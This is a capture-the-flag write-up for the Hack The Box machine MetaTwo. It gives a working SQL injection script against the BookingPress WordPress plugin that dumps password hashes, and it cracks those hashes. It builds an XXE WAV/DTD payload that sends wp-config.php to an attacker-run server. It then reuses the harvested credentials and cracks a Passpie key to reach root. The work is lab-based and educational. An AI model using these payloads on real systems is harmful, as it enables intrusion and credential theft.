# easy - MetaTwo Machine

IP Addr: 10.129.36.200

URL: https://app.hackthebox.com/machines/MetaTwo

## User flag



Webserver found and expecting a specific domain:

```bash
~» curl -I 10.129.36.200
HTTP/1.1 302 Moved Temporarily
Server: nginx/1.18.0
Date: Wed, 30 Nov 2022 01:22:19 GMT
Content-Type: text/html
Content-Length: 145
Connection: keep-alive
Location: http://metapress.htb/
```

A wordpress app found:

```bash
~» curl -I -H 'Host: metapress.htb' 10.129.36.200
HTTP/1.1 200 OK
Server: nginx/1.18.0
Date: Wed, 30 Nov 2022 01:25:00 GMT
Content-Type: text/html; charset=UTF-8
Connection: keep-alive
X-Powered-By: PHP/8.0.24
Set-Cookie: PHPSESSID=6anenfusf1jmkomkc089tg359n; path=/
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Link: <http://metapress.htb/wp-json/>; rel="https://api.w.org/"
```

Something interesting from nmap scanning:

```bash
sudo nmap -nv -Pn -sV -sC -O -T4 -oA nmap-scan 10.129.36.200
...
...
22/tcp   open     ssh            OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey:
|   3072 c4b44617d2102d8fec1dc927fecd79ee (RSA)
|   256 2aea2fcb23e8c529409cab866dcd4411 (ECDSA)
|_  256 fd78c0b0e22016fa050debd83f12a4ab (ED25519)
80/tcp   open     http           nginx 1.18.0
|_http-title: Did not follow redirect to http://metapress.htb/
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: nginx/1.18.0
```

On the web app UI, booked an appt, I can create events, humm:

![image-20221129214108707](../../../../images/articles/metatwo-writeup/image-20221129214108707.png)

After reviewing the /events page's source code I found this:

```html
<link 
      rel='stylesheet' 
      id='bookingpress_element_css-css'  
      href='http://metapress.htb/wp-content/plugins/ bookingpress-appointment-booking/css/bookingpress_element_theme.css?ver=1.0.10' 
      media='all' />
```

The page is using plugin "bookingpress-appointment-booking" on version "1.0.10" and found this SQL vulnerability: https://wpscan.com/vulnerability/388cd42d-b61a-42a4-8604-99b812db2357

As described in the Document, create an appointment with its shortcode embedded and find the "nonce":

```bash
~» curl -s 'http://metapress.htb/thank-you/?appointment_id=Mw==' | grep -i nonce
var postData = { action:'bookingpress_generate_spam_captcha', _wpnonce:'221f0d0bf9' };
```

The PoC is working:

```bash
.../infosec/p8/metatwo» cat sql.sh
#!/bin/bash
SQLI="UNION ALL SELECT @@version,@@version_comment,@@version_compile_os,1,2,3,4,5,6-- -"
curl \
        -s 'http://metapress.htb/wp-admin/admin-ajax.php' \
        --data \
        "action=bookingpress_front_get_category_services&_wpnonce=221f0d0bf9&category_id=33&total_service=-7502) ${SQLI}"

.../infosec/p8/metatwo» bash sql.sh  | jq
[
  {
    "bookingpress_service_id": "10.5.15-MariaDB-0+deb11u1",
    "bookingpress_category_id": "Debian 11",
    "bookingpress_service_name": "debian-linux-gnu",
    "bookingpress_service_price": "$1.00",
    "bookingpress_service_duration_val": "2",
    "bookingpress_service_duration_unit": "3",
    "bookingpress_service_description": "4",
    "bookingpress_service_position": "5",
    "bookingpress_servicedate_created": "6",
    "service_price_without_currency": 1,
    "img_url": "http://metapress.htb/wp-content/plugins/bookingpress-appointment-booking/images/placeholder-img.jpg"
  }
]
```

Change the query to:

```bash
SQLI="UNION ALL SELECT 1,2,3,4,5,6,7,8,concat(schema_name) FROM information_schema.schemata-- -"

# And the result:
~m» bash sql.sh  | jq '.[] | .bookingpress_servicedate_created'
"information_schema"
"blog"
```

Listing WP tables:

```bash
SQLI="UNION ALL SELECT 1,2,3,4,5,6,7,8,group_concat(table_name) from information_schema.tables where table_schema = database()-- -"

~m» bash sql.sh  | jq '.[] | .bookingpress_servicedate_created' | sed 's/,/\n/g'
"wp_options
wp_term_taxonomy
wp_bookingpress_servicesmeta
wp_commentmeta
wp_users
wp_bookingpress_customers_meta
wp_bookingpress_settings
wp_bookingpress_appointment_bookings
wp_bookingpress_customize_settings
wp_bookingpress_debug_payment_log
wp_bookingpress_services
wp_termmeta
wp_links
wp_bookingpress_entries
wp_bookingpress_categories
wp_bookingpress_customers
wp_bookingpress_notifications
wp_usermeta
wp_terms
wp_bookingpress_default_daysoff
wp_comments
wp_bookingpress_default_workhours
wp_postmeta
wp_bookingpress_form_fields
wp_bookingpress_payment_logs
wp_posts
wp_term_relationships"
```

Listing passwords:

```bash
SQLI="UNION ALL SELECT 1,2,3,4,5,6,7,8,group_concat(user_login,user_pass) from blog.wp_users-- -"

~m» bash sql.sh  | jq '.[] | .bookingpress_servicedate_created'
"admin$P$BGrGrgf2wToBS79i07Rk9sN4Fzk.TV.,manager$P$B4aNM28N0E.tMy/JIcnVMZbGcU16Q70"
```

Trying to crack hashes:

```bash
~m» cat hashes.txt
$P$BGrGrgf2wToBS79i07Rk9sN4Fzk.TV.
$P$B4aNM28N0E.tMy/JIcnVMZbGcU16Q70

~m» john -w=/usr/share/dict/rockyou.txt hashes.txt
...
Press 'q' or Ctrl-C to abort, almost any other key for status
partylikearockstar (?)
```

The password worked for WP Login (user manager):

![image-20221129225555338](../../../images/articles/metatwo-writeup/image-20221129225555338.png)



We have the ability to upload Media files, and we also know this WP version is vulnerable to XXE: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29447

We create a vulnerable media file:

```bash
» echo -en 'RIFF\x85\x00\x00\x00WAVEiXML\x79\x00\x00\x00<?xml version="1.0"?><!DOCTYPE ANY[<!ENTITY % remote SYSTEM '"'"'http://10.10.14.2:8000/xxe.dtd'"'"'>%remote;%init;%trick;]>\x00' > xxe.wav

» file xxe.wav
xxe.wav: RIFF (little-endian) data, WAVE audio
```

And then the malicious xxe.dtd

```xml
<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=../wp-config.php">
<!ENTITY % init "<!ENTITY &#x25; trick SYSTEM 'http://10.10.14.2:8000/?p=%file;'>" >
```



After running a python web server and uploading the malicious WAV file:

```bash
10.129.36.200 - - [29/Nov/2022 23:06:55] "GET /xxe.dtd HTTP/1.1" 200 -
10.129.36.200 - - [29/Nov/2022 23:15:22] "GET /?p=P...<stripped>...NCg== HTTP/1.1" 200 -
```

Then decoding it from base64:

```php
<?php
/** The name of the database for WordPress */
define( 'DB_NAME', 'blog' );

/** MySQL database username */
define( 'DB_USER', 'blog' );

/** MySQL database password */
define( 'DB_PASSWORD', '635Aq@TdqrCwXFUZ' );

/** MySQL hostname */
define( 'DB_HOST', 'localhost' );

/** Database Charset to use in creating database tables. */
define( 'DB_CHARSET', 'utf8mb4' );

/** The Database Collate type. Don't change this if in doubt. */
define( 'DB_COLLATE', '' );

define( 'FS_METHOD', 'ftpext' );
define( 'FTP_USER', 'metapress.htb' );
define( 'FTP_PASS', '9NYS_ii@FyL_p5M2NvJ' );
define( 'FTP_HOST', 'ftp.metapress.htb' );
define( 'FTP_BASE', 'blog/' );
define( 'FTP_SSL', false );

/**#@+
 * Authentication Unique Keys and Salts.
 * @since 2.6.0
 */
define( 'AUTH_KEY',         '?!Z$uGO*A6xOE5x,pweP4i*z;m`|.Z:X@)QRQFXkCRyl7}`rXVG=3 n>+3m?.B/:' );
define( 'SECURE_AUTH_KEY',  'x$i$)b0]b1cup;47`YVua/JHq%*8UA6g]0bwoEW:91EZ9h]rWlVq%IQ66pf{=]a%' );
define( 'LOGGED_IN_KEY',    'J+mxCaP4z<g.6P^t`ziv>dd}EEi%48%JnRq^2MjFiitn#&n+HXv]||E+F~C{qKXy' );
define( 'NONCE_KEY',        'SmeDr$$O0ji;^9]*`~GNe!pX@DvWb4m9Ed=Dd(.r-q{^z(F?)7mxNUg986tQO7O5' );
define( 'AUTH_SALT',        '[;TBgc/,M#)d5f[H*tg50ifT?Zv.5Wx=`l@v$-vH*<~:0]s}d<&M;.,x0z~R>3!D' );
define( 'SECURE_AUTH_SALT', '>`VAs6!G955dJs?$O4zm`.Q;amjW^uJrk_1-dI(SjROdW[S&~omiH^jVC?2-I?I.' );
define( 'LOGGED_IN_SALT',   '4[fS^3!=%?HIopMpkgYboy8-jl^i]Mw}Y d~N=&^JsI`M)FJTJEVI) N#NOidIf=' );
define( 'NONCE_SALT',       '.sU&CQ@IRlh O;5aslY+Fq8QWheSNxd6Ve#}w!Bq,h}V9jKSkTGsv%Y451F8L=bL' );

/**
 * WordPress Database Table prefix.
 */
$table_prefix = 'wp_';

/**
 * For developers: WordPress debugging mode.
 * @link https://wordpress.org/support/article/debugging-in-wordpress/
 */
define( 'WP_DEBUG', false );

/** Absolute path to the WordPress directory. */
if ( ! defined( 'ABSPATH' ) ) {
        define( 'ABSPATH', __DIR__ . '/' );
}

/** Sets up WordPress vars and included files. */
require_once ABSPATH . 'wp-settings.php';
```

We have FTP and MYSQL credentials :smile:

Trying FTP access:

```bash
.../infosec/p8/metatwo» ftp metapress.htb@metapress.htb
Connected to metapress.htb.
220 ProFTPD Server (Debian) [::ffff:10.129.36.200]
331 Password required for metapress.htb
Password:
230 User metapress.htb logged in
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> dir
200 PORT command successful
150 Opening ASCII mode data connection for file list
drwxr-xr-x   5 metapress.htb metapress.htb     4096 Oct  5 14:12 blog
drwxr-xr-x   3 metapress.htb metapress.htb     4096 Oct  5 14:12 mailer

ftp> cd mailer
ftp> get send_email.php
200 PORT command successful
150 Opening BINARY mode data connection for send_email.php (1126 bytes)
226 Transfer complete
1126 bytes received in 5,8e-05 seconds (18,5 Mbytes/s)
```

This send_email.php

```php
<?php
/*
 * This script will be used to send an email to all our users when ready for launch
*/

use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\SMTP;
use PHPMailer\PHPMailer\Exception;

require 'PHPMailer/src/Exception.php';
require 'PHPMailer/src/PHPMailer.php';
require 'PHPMailer/src/SMTP.php';

$mail = new PHPMailer(true);

$mail->SMTPDebug = 3;                               
$mail->isSMTP();            

$mail->Host = "mail.metapress.htb";
$mail->SMTPAuth = true;                          
$mail->Username = "jnelson@metapress.htb";                 
$mail->Password = "Cb4_JmWM8zUZWMu@Ys";                           
$mail->SMTPSecure = "tls";                           
$mail->Port = 587;                                   

$mail->From = "jnelson@metapress.htb";
$mail->FromName = "James Nelson";

$mail->addAddress("info@metapress.htb");

$mail->isHTML(true);

$mail->Subject = "Startup";
$mail->Body = "<i>We just started our new blog metapress.htb!</i>";

try {
    $mail->send();
    echo "Message has been sent successfully";
} catch (Exception $e) {
    echo "Mailer Error: " . $mail->ErrorInfo;
}

```

Turns out those Mail SMTPAuth credentials works for SSH:

```bash
jnelson@meta2:~$ id
uid=1000(jnelson) gid=1000(jnelson) groups=1000(jnelson)
```

## Getting root flag

Reviewing local dir:

```bash
jnelson@meta2:~$ ls -ltra
total 32
-rw-r--r-- 1 jnelson jnelson  807 Jun 26 15:46 .profile
-rw-r--r-- 1 jnelson jnelson 3526 Jun 26 15:46 .bashrc
-rw-r--r-- 1 jnelson jnelson  220 Jun 26 15:46 .bash_logout
lrwxrwxrwx 1 root    root       9 Jun 26 15:59 .bash_history -> /dev/null
drwxr-xr-x 3 root    root    4096 Oct  5 15:12 ..
drwxr-xr-x 3 jnelson jnelson 4096 Oct 25 12:51 .local
dr-xr-x--- 3 jnelson jnelson 4096 Oct 25 12:52 .passpie
drwxr-xr-x 4 jnelson jnelson 4096 Oct 25 12:53 .
-rw-r----- 1 jnelson jnelson   33 Nov 30 01:21 user.txt

jnelson@meta2:~/.passpie/ssh$ cat root.pass
comment: ''
fullname: root@ssh
login: root
modified: 2022-06-26 08:58:15.621572
name: ssh
password: '-----BEGIN PGP MESSAGE-----


  hQEOA6I+wl+LXYMaEAP/T8AlYP9z05SEST+Wjz7+IB92uDPM1RktAsVoBtd3jhr2

  nAfK00HJ/hMzSrm4hDd8JyoLZsEGYphvuKBfLUFSxFY2rjW0R3ggZoaI1lwiy/Km

  yG2DF3W+jy8qdzqhIK/15zX5RUOA5MGmRjuxdco/0xWvmfzwRq9HgDxOJ7q1J2ED

  /2GI+i+Gl+Hp4LKHLv5mMmH5TZyKbgbOL6TtKfwyxRcZk8K2xl96c3ZGknZ4a0Gf

  iMuXooTuFeyHd9aRnNHRV9AQB2Vlg8agp3tbUV+8y7szGHkEqFghOU18TeEDfdRg

  krndoGVhaMNm1OFek5i1bSsET/L4p4yqIwNODldTh7iB0ksB/8PHPURMNuGqmeKw

  mboS7xLImNIVyRLwV80T0HQ+LegRXn1jNnx6XIjOZRo08kiqzV2NaGGlpOlNr3Sr

  lpF0RatbxQGWBks5F3o=

  =uh1B

  -----END PGP MESSAGE-----

  '
```

Passpie is a password manager, I need to crack the .keys first:

```bash
jnelson@meta2:~$ ls -ltra .passpie/.keys
-r-xr-x--- 1 jnelson jnelson 5243 Jun 26 13:58 .passpie/.keys
```

```bash
» gpg2john keys > gpg.john
File keys

» john -w=/usr/share/dict/rockyou.txt gpg.john
...
blink182         (Passpie)
```

Now we have the passphrase.

These are the existing passwords stored:

```bash
jnelson@meta2:~$ passpie list
╒════════╤═════════╤════════════╤═══════════╕
│ Name   │ Login   │ Password   │ Comment   │
╞════════╪═════════╪════════════╪═══════════╡
│ ssh    │ jnelson │ ********   │           │
├────────┼─────────┼────────────┼───────────┤
│ ssh    │ root    │ ********   │           │
╘════════╧═════════╧════════════╧═══════════╛
```

Exporting and reviewing:

```bash
jnelson@meta2:~$ passpie export exported
Passphrase:

jnelson@meta2:~$ cat exported
credentials:
- comment: ''
  fullname: root@ssh
  login: root
  modified: 2022-06-26 08:58:15.621572
  name: ssh
  password: !!python/unicode 'p7qfAZt4_A1xo_0x'
- comment: ''
  fullname: jnelson@ssh
  login: jnelson
  modified: 2022-06-26 08:58:15.514422
  name: ssh
  password: !!python/unicode 'Cb4_JmWM8zUZWMu@Ys'
handler: passpie
version: 1.0
```

And then:

```bash
jnelson@meta2:~$ su root
Password:
root@meta2:/home/jnelson# id
uid=0(root) gid=0(root) groups=0(root)
```

